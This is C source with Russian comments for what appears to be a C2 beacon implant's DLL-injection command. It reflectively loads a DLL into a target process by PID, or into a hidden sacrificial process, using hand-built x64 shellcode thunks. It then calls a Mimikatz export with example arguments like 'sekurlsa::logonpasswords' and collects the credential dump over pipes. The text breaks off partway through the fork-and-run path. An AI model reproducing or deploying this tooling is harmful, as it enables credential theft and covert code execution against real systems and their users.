// Fork & Run / PID injection: inject any PE DLL via Co2H_ReflectiveLoader,
// затем вызвать указанный экспорт с командной строкой.
//
// OP_INJECT_DLL (opcode 106)
//
// KV payload:
//   dll      (bytes) -- сырые байты PE DLL
//   args     (utf8)  -- командная строка для экспорта (опц.; напр. "sekurlsa::logonpasswords exit")
//   pid      (u32)   -- инжектировать в существующий процесс; 0 / отсутствует = fork & run
//   spawn_to (utf8)  -- путь к жертвенному процессу для fork & run (опц.)
//
// Двухфазное выполнение:
//   Фаза 1 — Co2H_ReflectiveLoader маппирует DLL и записывает базу в LOADER_PARAM.out_module_base.
//   Фаза 2 — если args заданы и в DLL есть экспорт "powershell_reflective_mimikatz",
//            вызываем его в отдельном потоке; захватываем вывод двумя способами:
//              A) stdout-пайп (wprintf/WriteFile внутри DLL → пайп)
//              B) возвращаемое значение функции (HLOCAL wide-string) — через 22-байтовый
//                 ExportThunk, который сохраняет rax в ExportCtx.result.
//
// ExportThunk (x64 PIC, 22 байта):
//   sub  rsp, 0x28
//   mov  rbx, rcx          ; rcx = &ExportCtx (remote)
//   mov  rcx, [rbx+8]      ; args_ptr (wchar_t* в remote)
//   call [rbx+0]           ; fn_addr  (export VA)
//   mov  [rbx+24], rax     ; result   (HLOCAL, полные 64 бит)
//   add  rsp, 0x28
//   ret
//
// ExportCtx (32 байта, в блоке RWX после thunk+pad):
//   +0  PVOID fn_addr   -- VA экспорта в маппированном образе
//   +8  PVOID args_ptr  -- remote pointer на wchar_t[] с командной строкой
//   +16 PVOID _pad      -- выравнивание
//   +24 PVOID result    -- сюда thunk пишет rax (возвр. HLOCAL)
//
// PID-injection stdout: трамплин SetStdHandle → Co2H_ReflectiveLoader (см. TrampolineCtx).

#include "../core/beacon.h"
#include "../loader/loader.h"

// ---- Diagnostic logging ---------------------------------------------------

static void dlog(const char* msg) {
    int n = 0;
    while (msg[n] && n < 256) n++;
    out_write(msg, n);
}

// Пишет: "<label> 0xHHHHHHHH\n"
static void dlog_hex(const char* label, ULONGLONG v) {
    char buf[160];
    int n = 0;
    while (label[n] && n < 100) { buf[n] = label[n]; n++; }
    buf[n++] = ' '; buf[n++] = '0'; buf[n++] = 'x';
    static const char hx[] = "0123456789abcdef";
    BOOL leading = TRUE;
    for (int s = 60; s >= 0; s -= 4) {
        BYTE nib = (BYTE)((v >> s) & 0xF);
        if (nib != 0 || !leading || s == 0) {
            buf[n++] = hx[nib];
            leading = FALSE;
        }
    }
    buf[n++] = '\n';
    out_write(buf, n);
}

// Пишет: "<label> N\n" (десятично)
static void dlog_dec(const char* label, ULONGLONG v) {
    char buf[160];
    int n = 0;
    while (label[n] && n < 100) { buf[n] = label[n]; n++; }
    buf[n++] = ' ';
    char num[32]; int ni = 0;
    if (v == 0) num[ni++] = '0';
    else { while (v) { num[ni++] = (char)('0' + (v % 10)); v /= 10; } }
    while (ni > 0) buf[n++] = num[--ni];
    buf[n++] = '\n';
    out_write(buf, n);
}

// ---- PE helpers -----------------------------------------------------------

// Преобразует RVA в смещение в сыром файле через таблицу секций.
static uint32_t pe_rva_to_off(const uint8_t* raw, uint32_t raw_len, uint32_t rva) {
    if (raw_len < sizeof(IMAGE_DOS_HEADER)) return 0;
    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    LONG lfa = dos->e_lfanew;
    if (lfa < 0 || (uint32_t)lfa + sizeof(IMAGE_NT_HEADERS) > raw_len) return 0;
    const IMAGE_NT_HEADERS* nt = (const IMAGE_NT_HEADERS*)(raw + lfa);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections;
    for (WORD i = 0; i < n; i++) {
        uint32_t va  = sec[i].VirtualAddress;
        uint32_t vsz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                                : sec[i].SizeOfRawData;
        if (rva >= va && rva < va + vsz)
            return sec[i].PointerToRawData + (rva - va);
    }
    return 0;
}

// Возвращает RVA экспорта по имени (0 = не найден).
// RVA + база маппированного образа = виртуальный адрес для вызова.
static uint32_t pe_find_export_rva(const uint8_t* raw, uint32_t raw_len, const char* name) {
    if (raw_len < sizeof(IMAGE_DOS_HEADER)) return 0;
    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    LONG lfa = dos->e_lfanew;
    if (lfa < 0 || (uint32_t)lfa + sizeof(IMAGE_NT_HEADERS) > raw_len) return 0;
    const IMAGE_NT_HEADERS* nt = (const IMAGE_NT_HEADERS*)(raw + lfa);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    const IMAGE_DATA_DIRECTORY* dd =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress) return 0;

    uint32_t eoff = pe_rva_to_off(raw, raw_len, dd->VirtualAddress);
    if (!eoff || eoff + sizeof(IMAGE_EXPORT_DIRECTORY) > raw_len) return 0;
    const IMAGE_EXPORT_DIRECTORY* exp =
        (const IMAGE_EXPORT_DIRECTORY*)(raw + eoff);

    DWORD cnt_n = exp->NumberOfNames, cnt_f = exp->NumberOfFunctions;
    if (!cnt_n || !cnt_f) return 0;

    uint32_t no = pe_rva_to_off(raw, raw_len, exp->AddressOfNames);
    uint32_t oo = pe_rva_to_off(raw, raw_len, exp->AddressOfNameOrdinals);
    uint32_t fo = pe_rva_to_off(raw, raw_len, exp->AddressOfFunctions);
    if (!no || !oo || !fo) return 0;
    if (no + cnt_n*4 > raw_len || oo + cnt_n*2 > raw_len || fo + cnt_f*4 > raw_len)
        return 0;

    const DWORD* names = (const DWORD*)(raw + no);
    const WORD*  ords  = (const WORD*) (raw + oo);
    const DWORD* funcs = (const DWORD*)(raw + fo);

    size_t nlen = 0; while (name[nlen]) nlen++;
    for (DWORD i = 0; i < cnt_n; i++) {
        uint32_t soff = pe_rva_to_off(raw, raw_len, names[i]);
        if (!soff || soff >= raw_len) continue;
        const char* en = (const char*)(raw + soff);
        size_t j = 0;
        while (j < nlen && en[j] == name[j]) j++;
        if (j == nlen && !en[j]) {
            WORD ord = ords[i];
            if (ord >= cnt_f) continue;
            return funcs[ord]; // RVA в маппированном образе
        }
    }
    return 0;
}

// ---- Pipe helpers ---------------------------------------------------------

// Неблокирующий: читает всё доступное прямо сейчас.
static void drain_available(HANDLE hRead) {
    uint8_t buf[4096];
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) || !avail) break;
        DWORD rd = 0;
        if (!ReadFile(hRead, buf, sizeof(buf), &rd, NULL) || !rd) break;
        out_write(buf, rd);
    }
}

// Блокирующий: читает пока поток hThread жив, затем финальный drain.
static void drain_pipe(HANDLE hRead, HANDLE hThread, DWORD timeout_ms) {
    DWORD started = GetTickCount();
    uint8_t buf[4096];
    for (;;) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail > 0) {
            DWORD rd = 0;
            if (!ReadFile(hRead, buf, sizeof(buf), &rd, NULL) || !rd) break;
            out_write(buf, rd);
            started = GetTickCount();
            continue;
        }
        if (hThread && WaitForSingleObject(hThread, 50) == WAIT_OBJECT_0) {
            drain_available(hRead);
            return;
        }
        if (GetTickCount() - started >= timeout_ms) {
            const char m[] = "[!] inject_dll: output timeout\n";
            out_write(m, sizeof(m) - 1);
            return;
        }
    }
}

// ---- Loader section helpers -----------------------------------------------

// Находит .rldr в нашем PE через VirtualQuery → парсинг заголовков.
static BOOL get_loader_section(PVOID* sec_base, SIZE_T* sec_size, SIZE_T* entry_off) {
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery((LPCVOID)Co2H_ReflectiveLoader, &mbi, sizeof(mbi))) return FALSE;
    BYTE* mod = (BYTE*)mbi.AllocationBase;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(mod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Name[0]=='.' && sec[i].Name[1]=='r' && sec[i].Name[2]=='l' &&
            sec[i].Name[3]=='d' && sec[i].Name[4]=='r') {
            BYTE* b = mod + sec[i].VirtualAddress;
            SIZE_T s = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize
                                               : sec[i].SizeOfRawData;
            *sec_base  = b;
            *sec_size  = s;
            *entry_off = (SIZE_T)((BYTE*)Co2H_ReflectiveLoader - b);
            return TRUE;
        }
    }
    return FALSE;
}

// Copy .rldr section into remote process as RWX.
static PVOID write_loader_remote(HANDLE hp, SIZE_T* out_entry_off, SIZE_T* out_sec_size) {
    PVOID  sb = NULL; SIZE_T ss = 0, eo = 0;
    if (!get_loader_section(&sb, &ss, &eo)) return NULL;
    PVOID remote = nt_alloc_remote(hp, ss, PAGE_EXECUTE_READWRITE);
    if (!remote) return NULL;
    if (!nt_write(hp, remote, sb, ss)) {
        nt_free_remote(hp, remote); return NULL;
    }
    *out_entry_off = eo;
    *out_sec_size  = ss;
    return remote;
}

// Copy raw DLL bytes into remote process (PAGE_READWRITE: loader maps it).
static PVOID write_dll_remote(HANDLE hp, const uint8_t* dll, DWORD len) {
    PVOID base = nt_alloc_remote(hp, len, PAGE_READWRITE);
    if (!base) return NULL;
    if (!nt_write(hp, base, dll, len)) {
        nt_free_remote(hp, base); return NULL;
    }
    return base;
}

// Write LOADER_PARAM into remote process.
static PVOID write_param_remote(HANDLE hp,
                                PVOID remote_dll,    DWORD  dll_len,
                                PVOID remote_loader, SIZE_T loader_sz,
                                SIZE_T entry_off) {
    LOADER_PARAM p;
    rt_memset(&p, 0, sizeof(p));
    p.raw_pe              = remote_dll;
    p.raw_pe_size         = dll_len;
    p.flags               = 0;
    p.out_module_base     = NULL;
    p.loader_section      = remote_loader;
    p.loader_section_size = (DWORD)loader_sz;
    p.entry_offset        = (DWORD)entry_off;
    PVOID remote = nt_alloc_remote(hp, sizeof(p), PAGE_READWRITE);
    if (!remote) return NULL;
    if (!nt_write(hp, remote, &p, sizeof(p))) {
        nt_free_remote(hp, remote); return NULL;
    }
    return remote;
}

// Write UTF-8 string as wide chars into remote process.
static PVOID write_wargs_remote(HANDLE hp, const char* utf8, int len) {
    wchar_t wbuf[2048];
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8, len, wbuf, 2047);
    if (wlen <= 0) return NULL;
    wbuf[wlen] = 0;
    SIZE_T sz = (SIZE_T)(wlen + 1) * sizeof(wchar_t);
    PVOID remote = nt_alloc_remote(hp, sz, PAGE_READWRITE);
    if (!remote) return NULL;
    if (!nt_write(hp, remote, wbuf, sz)) {
        nt_free_remote(hp, remote); return NULL;
    }
    return remote;
}

// ---- ExportThunk ----------------------------------------------------------
//
// Вызов экспорта DLL с захватом 64-битного возвращаемого значения.
// Thunk использует абсолютные адреса (RCX-независим) и пишет rax
// в отдельный RW-блок (ExportCtx), чтобы работать даже когда kit
// выделяет код как RX.
//
// Формат thunk (44 байта):
//   sub rsp, 0x28
//   mov rcx, <args_ptr>         ; абсолютный адрес аргументов
//   mov rax, <fn_addr>          ; абсолютный адрес экспорта
//   call rax
//   mov rcx, <&result_slot>     ; абсолютный адрес в remote ExportCtx
//   mov [rcx], rax              ; пишет 64-битный результат
//   add rsp, 0x28
//   ret

#pragma pack(push, 1)
typedef struct {
    PVOID fn_addr;    // +0  VA экспорта
    PVOID args_ptr;   // +8  remote wchar_t* с командной строкой
    PVOID _pad;       // +16 выравнивание
    PVOID result;     // +24 сюда thunk пишет rax (HLOCAL)
} ExportCtx;
#pragma pack(pop)

// Вызывает экспорт DLL по RVA относительно module_base.
// Дренирует stdout-пайп во время выполнения, затем читает HLOCAL-возврат.
static void call_export_remote(HANDLE hProc, DWORD target_pid, HANDLE hRead,
                               PVOID module_base, uint32_t export_rva,
                               const char* args_utf8, uint32_t args_len) {
    // Пишем wide-строку аргументов в удалённый процесс
    PVOID remote_args = write_wargs_remote(hProc, args_utf8, (int)args_len);
    if (!remote_args) {
        const char e[] = "[!] inject_dll: write args failed\n";
        out_write(e, sizeof(e)-1); return;
    }

    // ExportCtx в отдельной RW-аллокации (thunk будет писать result туда).
    ExportCtx ectx;
    ectx.fn_addr  = (uint8_t*)module_base + export_rva;
    ectx.args_ptr = remote_args;
    ectx._pad     = NULL;
    ectx.result   = NULL;
    PVOID remote_ectx = nt_alloc_remote(hProc, sizeof(ectx), PAGE_READWRITE);
    if (!remote_ectx) {
        nt_free_remote(hProc, remote_args);
        const char e[] = "[!] inject_dll: alloc ExportCtx failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    nt_write(hProc, remote_ectx, &ectx, sizeof(ectx));

    // Собираем thunk с абсолютными адресами (44 байта).
    uint8_t thunk[44];
    {
        int p = 0;
        thunk[p++] = 0x48; thunk[p++] = 0x83;
        thunk[p++] = 0xEC; thunk[p++] = 0x28;              // sub rsp, 0x28
        thunk[p++] = 0x48; thunk[p++] = 0xB9;              // mov rcx, imm64
        *(uint64_t*)(thunk + p) = (uint64_t)(uintptr_t)remote_args; p += 8;
        thunk[p++] = 0x48; thunk[p++] = 0xB8;              // mov rax, imm64
        *(uint64_t*)(thunk + p) = (uint64_t)(uintptr_t)ectx.fn_addr; p += 8;
        thunk[p++] = 0xFF; thunk[p++] = 0xD0;              // call rax
        thunk[p++] = 0x48; thunk[p++] = 0xB9;              // mov rcx, imm64
        *(uint64_t*)(thunk + p) = (uint64_t)(uintptr_t)((uint8_t*)remote_ectx + 24); p += 8;
        thunk[p++] = 0x48; thunk[p++] = 0x89; thunk[p++] = 0x01; // mov [rcx], rax
        thunk[p++] = 0x48; thunk[p++] = 0x83;
        thunk[p++] = 0xC4; thunk[p++] = 0x28;              // add rsp, 0x28
        thunk[p++] = 0xC3;                                  // ret
    }

    dlog_hex("[*] export fn_addr =", (ULONGLONG)(uintptr_t)ectx.fn_addr);
    dlog_hex("[*] remote_args    =", (ULONGLONG)(uintptr_t)remote_args);
    dlog_hex("[*] remote_ectx    =", (ULONGLONG)(uintptr_t)remote_ectx);

    // Запускаем через inject kit.
    HANDLE hThread = NULL; void* rbase_exp = NULL;
    uint32_t rc = kit_inject(hProc, target_pid, 0 /* THREAD */,
                             thunk, sizeof(thunk),
                             NULL, 0, &hThread, NULL, &rbase_exp);
    if (rc != 0 || !hThread) {
        nt_free_remote(hProc, remote_ectx);
        nt_free_remote(hProc, remote_args);
        const char e[] = "[!] inject_dll: kit_inject (export) failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    dlog("[*] export launched via kit\n");

    // Дренируем stdout-пайп пока экспорт работает
    drain_pipe(hRead, hThread, 30000);

    DWORD export_exit = 0xDEADBEEF;
    GetExitCodeThread(hThread, &export_exit);
    dlog_hex("[*] export exit code (truncated) =", export_exit);

    CloseHandle(hThread);

    // Читаем возвращаемое значение (HLOCAL wide-string) из ExportCtx.result
    ExportCtx local_ctx;
    rt_memset(&local_ctx, 0, sizeof(local_ctx));
    nt_read(hProc, remote_ectx, &local_ctx, sizeof(local_ctx));
    dlog_hex("[*] result pointer =", (ULONGLONG)(uintptr_t)local_ctx.result);

    if (local_ctx.result) {
        SIZE_T   wbuf_bytes = 512 * 1024;
        wchar_t* wbuf = (wchar_t*)nt_alloc_local(wbuf_bytes, PAGE_READWRITE);
        if (wbuf) {
            SIZE_T total_read = 0;
            SIZE_T offset = 0;
            BOOL found_null = FALSE;
            const SIZE_T chunk = 4096;
            uint8_t* dst = (uint8_t*)wbuf;
            uint8_t* src = (uint8_t*)local_ctx.result;

            while (offset + chunk <= wbuf_bytes - 2 && !found_null) {
                BOOL ok = nt_read(hProc, src + offset, dst + offset, chunk);
                SIZE_T rd = ok ? chunk : 0;
                if (!ok || rd == 0) break;
                total_read += rd;
                wchar_t* wp = (wchar_t*)(dst + offset);
                SIZE_T wcount = rd / sizeof(wchar_t);
                for (SIZE_T i = 0; i < wcount; i++) {
                    if (wp[i] == 0) { found_null = TRUE; break; }
                }
                offset += rd;
                if (rd < chunk) break;
            }

            dlog_dec("[*] total bytes read =", total_read);

            if (total_read > 0) {
                wbuf[total_read / sizeof(wchar_t)] = 0;
                int need = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, NULL, 0, NULL, NULL);
                dlog_dec("[*] utf8 needed =", need);
                if (need > 1) {
                    char* mbuf = (char*)nt_alloc_local((SIZE_T)need, PAGE_READWRITE);
                    if (mbuf) {
                        int wrote = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1,
                                                        mbuf, need, NULL, NULL);
                        if (wrote > 1) {
                            dlog("---- mimikatz output ----\n");
                            out_write(mbuf, (DWORD)(wrote - 1));
                            dlog("\n---- end output ----\n");
                        }
                        nt_free_local(mbuf);
                    }
                }
            }
            nt_free_local(wbuf);
        }
    } else {
        dlog("[!] export returned NULL — mimikatz output buffer empty\n");
    }

    nt_free_remote(hProc, remote_ectx);
    nt_free_remote(hProc, remote_args);
}

// ---- Трамплин для перенаправления stdout при PID-инъекции ----------------
//
// TrampolineCtx (32 байта, сразу после кода трамплина):
//   +0  PVOID  SetStdHandle (одинаков во всех процессах, shared kernel32 mapping)
//   +8  HANDLE pipe_write   (write-конец пайпа, dup'нутый в целевой процесс)
//   +16 PVOID  loader_fn    (Co2H_ReflectiveLoader в удалённом процессе)
//   +24 PVOID  loader_param (&LOADER_PARAM в удалённом процессе)
//
// Трамплин (49 байт, PIC x64, RIP-relative — не зависит от RCX):
//   lea rbx, [rip+42]  → TrampolineCtx сразу после кода
//   SetStdHandle(STD_OUTPUT_HANDLE, pipe)
//   SetStdHandle(STD_ERROR_HANDLE,  pipe)
//   Co2H_ReflectiveLoader(loader_param)
//   ret
//
// Компоновка буфера: [49 code][32 TrampolineCtx] = 81 байт.
// Передаётся в kit_inject как единый shellcode blob.

#pragma pack(push, 1)
typedef struct {
    PVOID  set_std_handle;  // +0
    HANDLE pipe_write;      // +8
    PVOID  loader_fn;       // +16
    PVOID  loader_param;    // +24
} TrampolineCtx;
#pragma pack(pop)

#define TRAMPOLINE_CODE_SZ 49

static const uint8_t kTrampoline[TRAMPOLINE_CODE_SZ] = {
    0x48, 0x8D, 0x1D, 0x2A, 0x00, 0x00, 0x00, // lea  rbx, [rip+42] → data
    0x48, 0x83, 0xEC, 0x28,                     // sub  rsp, 0x28
    0x48, 0xC7, 0xC1, 0xF5, 0xFF, 0xFF, 0xFF,  // mov  rcx, -11
    0x48, 0x8B, 0x53, 0x08,                     // mov  rdx, [rbx+8]
    0xFF, 0x13,                                  // call [rbx+0]  (SetStdHandle stdout)
    0x48, 0xC7, 0xC1, 0xF4, 0xFF, 0xFF, 0xFF,  // mov  rcx, -12
    0x48, 0x8B, 0x53, 0x08,                     // mov  rdx, [rbx+8]
    0xFF, 0x13,                                  // call [rbx+0]  (SetStdHandle stderr)
    0x48, 0x8B, 0x4B, 0x18,                     // mov  rcx, [rbx+24] (loader_param)
    0xFF, 0x53, 0x10,                            // call [rbx+16]     (loader_fn)
    0x48, 0x83, 0xC4, 0x28,                     // add  rsp, 0x28
    0xC3                                         // ret
};

// ---- Named pipe helper ----------------------------------------------------

static void make_pipe_name(wchar_t* out, size_t cap) {
    DWORD rnd = GetTickCount() ^ (GetCurrentProcessId() << 8);
    const wchar_t prefix[] = L"\\\\.\\pipe\\co2h_";
    size_t i = 0;
    while (prefix[i] && i < cap - 9) { out[i] = prefix[i]; i++; }
    static const wchar_t hx[] = L"0123456789abcdef";
    for (int s = 28; s >= 0; s -= 4) out[i++] = hx[(rnd >> s) & 0xF];
    out[i] = 0;
}

// ---- OP_INJECT_DLL --------------------------------------------------------

void cmd_inject_dll(const BeaconTask* t) {
    dlog("[*] inject_dll: handler entered\n");

    // Разбор payload
    const uint8_t* dll_bytes = NULL; uint32_t dll_len = 0;
    kv_find(t->pay, t->pay_len, "dll", &dll_bytes, &dll_len);
    if (!dll_bytes || dll_len < 0x1000) {
        const char e[] = "inject_dll: missing or too-small dll\n";
        out_write(e, sizeof(e)-1); return;
    }

    uint32_t pid = 0;
    kv_get_u32(t->pay, t->pay_len, "pid", &pid);

    const uint8_t* args_bytes = NULL; uint32_t args_len = 0;
    kv_find(t->pay, t->pay_len, "args", &args_bytes, &args_len);

    dlog_dec("[*] dll_len  =", dll_len);
    dlog_dec("[*] args_len =", args_len);
    dlog_dec("[*] pid      =", pid);

    // Ищем экспорт "powershell_reflective_mimikatz" в сырых байтах DLL.
    uint32_t export_rva = 0;
    if (args_bytes && args_len > 0) {
        char exp[32];
        const char src[] = "powershell_reflective_mimikatz";
        for (int i = 0; i < (int)sizeof(src); i++) exp[i] = src[i];
        export_rva = pe_find_export_rva(dll_bytes, dll_len, exp);
        dlog_hex("[*] export_rva =", export_rva);
        if (!export_rva) {
            dlog("[!] export 'powershell_reflective_mimikatz' NOT FOUND in DLL\n");
        }
    }

    // =========================================================================
    // PATH A: Инъекция в существующий процесс по PID.
    //   Трамплин перенаправляет stdout/stderr в именованный пайп,
    //   затем вызывает Co2H_ReflectiveLoader. После загрузки — вызов экспорта.
    // =========================================================================
    if (pid != 0) {
        HANDLE hProc = nt_open_process(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
            PROCESS_VM_WRITE | PROCESS_VM_READ |
            PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
            (DWORD)pid);
        if (!hProc) {
            const char e[] = "inject_dll: OpenProcess failed\n";
            out_write(e, sizeof(e)-1); return;
        }
        dlog_dec("[*] target PID =", pid);

        // Именованный пайп (overlapped: ConnectNamedPipe не блокирует)
        wchar_t pipe_name[64];
        make_pipe_name(pipe_name, 64);
        HANDLE hPipeRead = CreateNamedPipeW(pipe_name,
            PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 128*1024, 128*1024, 0, NULL);
        if (hPipeRead == INVALID_HANDLE_VALUE) {
            CloseHandle(hProc);
            const char e[] = "inject_dll: CreateNamedPipe failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        OVERLAPPED ov; rt_memset(&ov, 0, sizeof(ov));
        ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        ConnectNamedPipe(hPipeRead, &ov);

        HANDLE hPipeWrite = CreateFileW(pipe_name, GENERIC_WRITE, 0, NULL,
                                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hPipeWrite == INVALID_HANDLE_VALUE) {
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: open pipe write end failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        HANDLE remote_pipe_write = NULL;
        if (!DuplicateHandle(GetCurrentProcess(), hPipeWrite,
                             hProc, &remote_pipe_write, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            CloseHandle(hPipeWrite);
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: DuplicateHandle failed\n";
            out_write(e, sizeof(e)-1); return;
        }
        CloseHandle(hPipeWrite);

        // Пишем секцию .rldr
        SIZE_T loader_entry_off = 0, loader_sz = 0;
        PVOID remote_loader = write_loader_remote(hProc, &loader_entry_off, &loader_sz);
        if (!remote_loader) {
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: write loader failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        PVOID remote_dll = write_dll_remote(hProc, dll_bytes, dll_len);
        if (!remote_dll) {
            nt_free_remote(hProc, remote_loader);
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: write DLL failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        PVOID remote_param = write_param_remote(hProc,
                                                remote_dll, dll_len,
                                                remote_loader, loader_sz, loader_entry_off);
        if (!remote_param) {
            nt_free_remote(hProc, remote_dll);
            nt_free_remote(hProc, remote_loader);
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: write LOADER_PARAM failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        // SetStdHandle одинаков во всех процессах (shared ASLR kernel32)
        PVOID fn_ssh = (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "SetStdHandle");

        // Собираем RIP-relative трамплин + TrampolineCtx (81 байт).
        // kit_inject выделит память и запустит исполнение через выбранный метод.
        uint8_t local_buf[TRAMPOLINE_CODE_SZ + sizeof(TrampolineCtx)];
        rt_memcpy(local_buf, kTrampoline, TRAMPOLINE_CODE_SZ);
        TrampolineCtx tctx;
        tctx.set_std_handle = fn_ssh;
        tctx.pipe_write     = remote_pipe_write;
        tctx.loader_fn      = (uint8_t*)remote_loader + loader_entry_off;
        tctx.loader_param   = remote_param;
        rt_memcpy(local_buf + TRAMPOLINE_CODE_SZ, &tctx, sizeof(tctx));

        // Фаза 1: запуск через inject kit.
        HANDLE hThread = NULL; void* rbase_stub = NULL;
        uint32_t rc = kit_inject(hProc, (DWORD)pid, 0 /* THREAD */,
                                 local_buf, sizeof(local_buf),
                                 NULL, 0, &hThread, NULL, &rbase_stub);
        if (rc != 0 || !hThread) {
            nt_free_remote(hProc, remote_param);
            nt_free_remote(hProc, remote_dll);
            nt_free_remote(hProc, remote_loader);
            CloseHandle(ov.hEvent); CloseHandle(hPipeRead); CloseHandle(hProc);
            const char e[] = "inject_dll: kit_inject (trampoline) failed\n";
            out_write(e, sizeof(e)-1); return;
        }

        dlog("[*] trampoline launched via kit, waiting...\n");

        // Ждём завершения лоадера, забираем то что успело попасть в пайп
        DWORD wait_rc = WaitForSingleObject(hThread, 60000);
        dlog_hex("[*] WaitForSingleObject rc =", wait_rc);

        DWORD trampoline_exit = 0xDEADBEEF;
        GetExitCodeThread(hThread, &trampoline_exit);
        dlog_dec("[*] trampoline exit code =", trampoline_exit);

        drain_available(hPipeRead);
        CloseHandle(hThread);

        // Читаем LOADER_PARAM из удалённого процесса
        LOADER_PARAM lp;
        rt_memset(&lp, 0, sizeof(lp));
        SIZE_T rd_lp = 0;
        BOOL ok_lp = nt_read(hProc, remote_param, &lp, sizeof(lp));
        if (ok_lp) rd_lp = sizeof(lp);
        dlog_dec("[*] RPM(LOADER_PARAM) ok =", ok_lp ? 1 : 0);
        dlog_dec("[*] RPM bytes read =", rd_lp);
        dlog_hex("[*] out_module_base =", (ULONGLONG)(uintptr_t)lp.out_module_base);

        // Фаза 2: вызов экспорта (если args + экспорт найден)
        if (export_rva && args_bytes && args_len > 0
            && lp.out_module_base && (uintptr_t)lp.out_module_base > 0x10000) {
            dlog("[*] phase 2: calling export\n");
            call_export_remote(hProc, (DWORD)pid, hPipeRead,
                               lp.out_module_base, export_rva,
                               (const char*)args_bytes, args_len);
        } else {
            if (export_rva && args_bytes && args_len > 0) {
                dlog("[!] skip export: out_module_base looks like STEP marker (loader failed)\n");
            }
            drain_pipe(hPipeRead, NULL, 5000);
        }

        CloseHandle(ov.hEvent);
        CloseHandle(hPipeRead);
        CloseHandle(hProc);
        dlog("[*] inject_dll: PATH A done\n");
        return;
    }

    // =========================================================================
    // PATH B: Fork & Run — жертвенный процесс с унаследованным stdout-пайпом.
    // =========================================================================

    char spawn_buf[MAX_PATH];
    rt_memset(spawn_buf, 0, sizeof(spawn_buf));
    kv_get_str(t->pay, t->pay_len, "spawn_to", spawn_buf, sizeof(spawn_buf));
    if (!spawn_buf[0]) {
        BeaconState* bs = beacon_state();
        for (size_t i = 0; i < sizeof(spawn_buf)-1 && bs->spawn_to[i]; i++)
            spawn_buf[i] = (char)bs->spawn_to[i];
    }
    if (!spawn_buf[0]) {
        const char def[] = "C:\\Windows\\System32\\notepad.exe";
        for (size_t i = 0; i < sizeof(def); i++) spawn_buf[i] = def[i];
    }

    SECURITY_ATTRIBUTES sa;
    rt_memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE;

    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa, 128*1024)) {
        const char e[] = "inject_dll: CreatePipe failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    wchar_t cmd_w[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, spawn_buf, -1, cmd_w, MAX_PATH);

    STARTUPINFOW si; rt_memset(&si, 0, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = NULL;
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;

    PROCESS_INFORMATION pi; rt_memset(&pi, 0, sizeof(pi));
    if (!CreateProcessW(NULL, cmd_w, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        const char e[] = "inject_dll: CreateProcess failed\n";
        out_write(e, sizeof(e)-1); return;
    }
    CloseHandle(hWrite);
    dlog_dec("[*] sacrificial PID =", pi.dwProcessId);

